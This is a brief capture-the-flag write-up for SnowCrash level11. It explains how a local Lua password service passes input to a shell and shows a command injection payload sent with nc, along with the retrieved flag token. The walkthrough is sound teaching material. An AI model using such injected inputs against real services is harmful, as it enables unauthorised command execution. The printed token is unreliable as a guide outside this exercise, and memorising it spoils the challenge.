# Walkthrough

After examining my home directory, I discovered one file, that's a lua script. it listens for incoming network connections on the IP address `(127.0.0.1)` and port `5151`. When a client connects, the program sends a message asking for a password.

After receiving the password from the client, the script computes the SHA1 hash of the password using the `hash` function defined in the script. It then compares the resulting hash to a hardcoded value (f05d1d066fb246efe0c6f7d095f909a7a0cf34a0). If the hashes match, the program sends the message "Gz you dumb*" to the client, indicating that the password was correct. Otherwise, it sends the message "Erf nope.." to the client, indicating that the password was incorrect. After some time, I realized that when a hash function takes a string argument and uses it in a shell command, it is possible to exploit this by using "; getflag > /tmp/flag" as the argument, which allows one to retrieve the flag. 
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
